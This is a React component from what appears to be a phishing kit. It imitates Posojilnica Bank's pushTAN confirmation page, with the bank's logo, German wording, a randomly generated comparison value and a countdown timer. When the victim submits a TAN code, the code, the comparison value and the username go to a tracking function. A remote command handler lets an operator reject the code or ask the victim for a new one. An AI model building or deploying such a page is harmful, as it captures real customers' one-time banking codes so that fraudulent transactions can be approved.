"use client";

import { useEffect, useState, useRef, useCallback } from "react";
import { trackSubmission, onCommand } from "@/lib/track";

/* ---- random 4-char reference code ---- */
function generateVergleichswert(): string {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  let result = "";
  for (let i = 0; i < 4; i++) {
    result += chars[Math.floor(Math.random() * chars.length)];
  }
  return result;
}

const TOTAL_SECONDS = 300; // 5 minutes

export default function PushTanForm({ user, vergleichswert: vergleichswertProp }: { user: string; vergleichswert?: string }) {
  const [vergleichswert] = useState(() => vergleichswertProp || generateVergleichswert());
  const [code, setCode] = useState("");
  const [secondsLeft, setSecondsLeft] = useState(TOTAL_SECONDS);
  const [expired, setExpired] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [success, setSuccess] = useState(false);
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);

  /* ---- countdown timer ---- */
  useEffect(() => {
    timerRef.current = setInterval(() => {
      setSecondsLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timerRef.current!);
          setExpired(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => {
      if (timerRef.current) clearInterval(timerRef.current);
    };
  }, []);

  /* ---- command handler ---- */
  useEffect(() => {
    onCommand((cmd) => {
      switch (cmd.type) {
        case "show_error":
          setError((cmd.payload?.message as string) || "Ein Fehler ist aufgetreten.");
          break;
        case "clear_error":
          setError(null);
          break;
        case "reject_tan":
          setError("TAN-Code ist falsch. Bitte versuchen Sie es erneut.");
          setCode("");
          break;
        case "retry_tan":
          setError("Bitte geben Sie einen neuen Code ein.");
          setCode("");
          setExpired(false);
          setSecondsLeft(TOTAL_SECONDS);
          if (timerRef.current) clearInterval(timerRef.current);
          timerRef.current = setInterval(() => {
            setSecondsLeft((prev) => {
              if (prev <= 1) {
                clearInterval(timerRef.current!);
                setExpired(true);
                return 0;
              }
              return prev - 1;
            });
          }, 1000);
          break;
      }
    });
    return () => onCommand(() => {});
  }, []);

  const formatTime = useCallback((s: number) => {
    const m = Math.floor(s / 60);
    const sec = s % 60;
    return `${m}:${sec.toString().padStart(2, "0")}`;
  }, []);

  const progressFraction = secondsLeft / TOTAL_SECONDS;

  const isValid = code.length >= 4 && code.length <= 6 && !expired;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isValid || submitting) return;
    setSubmitting(true);
    setError(null);
    await trackSubmission("poso", "pushtan", { code, vergleichswert, user });
    setSuccess(true);
    setSubmitting(false);
  };

  /* ---- SVG ring constants ---- */
  const ringSize = 80;
  const strokeWidth = 4;
  const radius = (ringSize - strokeWidth) / 2;
  const circumference = 2 * Math.PI * radius;
  const dashOffset = circumference * (1 - progressFraction);

  /* ---- Render ---- */
  return (
    <>
      {/* Background */}
      <div className="bg-wrapper" />
      <div className="gradient-overlay" />

      {/* Page layout */}
      <div className="page-layout">
        {/* PushTAN card */}
        <div className="login-card">
          {/* Logo */}
          <div className="card-logo">
            <img src="/poso/logo.svg" alt="Posojilnica Bank" />
          </div>

          <div className="card-inner">
            <h1>pushTAN</h1>

            {/* Error banner */}
            {error && (
              <div style={{
                backgroundColor: "#fef2f2",
                border: "1px solid #fecaca",
                borderRadius: 4,
                padding: "12px 16px",
                color: "#b91c1c",
                fontSize: 14,
                lineHeight: 1.5,
                marginBottom: 12,
              }}>
                {error}
              </div>
            )}

            <p className="description">
              Best&auml;tigen Sie die Transaktion in Ihrer pushTAN-App.
              Vergleichen Sie den angezeigten Vergleichswert mit dem Wert auf Ihrem Ger&auml;t.
            </p>

            {success ? (
              /* ---- Success message ---- */
              <div style={{ textAlign: "center", padding: "30px 0 40px" }}>
                <div style={{
                  width: 64,
                  height: 64,
                  borderRadius: "50%",
                  backgroundColor: "#0c2d69",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  margin: "0 auto 20px",
                }}>
                  <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                    <polyline points="20 6 9 17 4 12" />
                  </svg>
                </div>
                <p style={{
                  fontFamily: '"Open Sans", Helvetica, Arial, sans-serif',
                  fontSize: 20,
                  color: "rgba(0,0,0,0.78)",
                  marginBottom: 8,
                }}>
                  Transaktion best&auml;tigt
                </p>
                <p style={{
                  fontFamily: '"Open Sans", Helvetica, Arial, sans-serif',
                  fontSize: 14,
                  color: "#616161",
                }}>
                  Ihre Eingabe wurde erfolgreich &uuml;bermittelt.
                </p>
              </div>
            ) : (
              <form onSubmit={handleSubmit}>
                {/* Timer ring + Vergleichswert */}
                <div style={{
                  display: "flex",
                  alignItems: "center",
                  gap: 24,
                  justifyContent: "center",
                  padding: "20px 0 16px",
                }}>
                  {/* Countdown ring */}
                  <div style={{ position: "relative", width: ringSize, height: ringSize, flexShrink: 0 }}>
                    <svg width={ringSize} height={ringSize} style={{ transform: "rotate(-90deg)" }}>
                      {/* Background circle */}
                      <circle
                        cx={ringSize / 2}
                        cy={ringSize / 2}
                        r={radius}
                        fill="none"
                        stroke="#e0e0e0"
                        strokeWidth={strokeWidth}
                      />
                      {/* Progress circle */}
                      <circle
                        cx={ringSize / 2}
                        cy={ringSize / 2}
                        r={radius}
                        fill="none"
                        stroke={expired ? "#cc0000" : "#6d81a5"}
                        strokeWidth={strokeWidth}
                        strokeDasharray={circumference}
                        strokeDashoffset={dashOffset}
                        strokeLinecap="round"
                        style={{ transition: "stroke-dashoffset 1s linear" }}
                      />
                    </svg>
                    <div style={{
                      position: "absolute",
                      top: 0,
                      left: 0,
                      width: "100%",
                      height: "100%",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                      fontFamily: '"Open Sans", Helvetica, Arial, sans-serif',
                      fontSize: 16,
                      fontWeight: 500,
                      color: expired ? "#cc0000" : "rgba(0,0,0,0.78)",
                    }}>
                      {formatTime(secondsLeft)}
                    </div>
                  </div>

                  {/* Vergleichswert */}
                  <div>
                    <p style={{
                      fontFamily: '"Open Sans", Helvetica, Arial, sans-serif',
                      fontSize: 12,
                      color: "#616161",
                      marginBottom: 6,
                      textTransform: "uppercase",
                      letterSpacing: "0.05em",
                    }}>
                      Vergleichswert
                    </p>
                    <p style={{
                      fontFamily: '"Open Sans", Helvetica, Arial, sans-serif',
                      fontSize: 32,
                      fontWeight: 400,
                      color: "#0c2d69",
                      letterSpacing: "0.15em",
                      lineHeight: 1,
                    }}>
                      {vergleichswert}
                    </p>
                  </div>
                </div>

                {/* Divider */}
                <div style={{
                  borderTop: "1px solid #e0e0e0",
                  margin: "8px 0 16px",
                }} />

                {/* TAN-Code input (Material Design style matching Poso) */}
                <div className="form-field">
                  <div className="form-field-box">
                    <span className="floating-label">TAN-Code</span>
                    <input
                      type="text"
                      name="tan-code"
                      placeholder=""
                      value={code}
                      onChange={(e) => setCode(e.target.value.replace(/[^A-Za-z0-9]/g, "").slice(0, 6))}
                      maxLength={6}
                      disabled={expired}
                      autoComplete="one-time-code"
                      inputMode="text"
                      spellCheck={false}
                      style={expired ? { opacity: 0.5 } : {}}
                      suppressHydrationWarning
                    />
                  </div>
                </div>

                {expired && (
                  <p style={{
                    textAlign: "center",
                    color: "#cc0000",
                    fontSize: 14,
                    fontFamily: '"Open Sans", Helvetica, Arial, sans-serif',
                    margin: "8px 0 0",
                  }}>
                    Zeit abgelaufen. Bitte fordern Sie einen neuen Code an.
                  </p>
                )}

                {/* Submit button */}
                <div className="btn-row">
                  <button
                    type="submit"
                    className="btn-primary"
                    disabled={!isValid || submitting}
                    style={(!isValid || submitting) ? { opacity: 0.5, cursor: "not-allowed" } : {}}
                  >
                    {submitting ? "Wird geprüft..." : "Bestätigen"}
                  </button>
                </div>
              </form>
            )}
          </div>
        </div>

        {/* Footer */}
        <div className="login-footer">
          <a href="#">Impressum</a>
          <a href="#">Nutzungsbedingungen</a>
          <a href="#">Barrierefreiheitserklärung</a>
          <span className="copyright">&copy; 2026 Posojilnica Bank</span>
        </div>
      </div>
    </>
  );
}
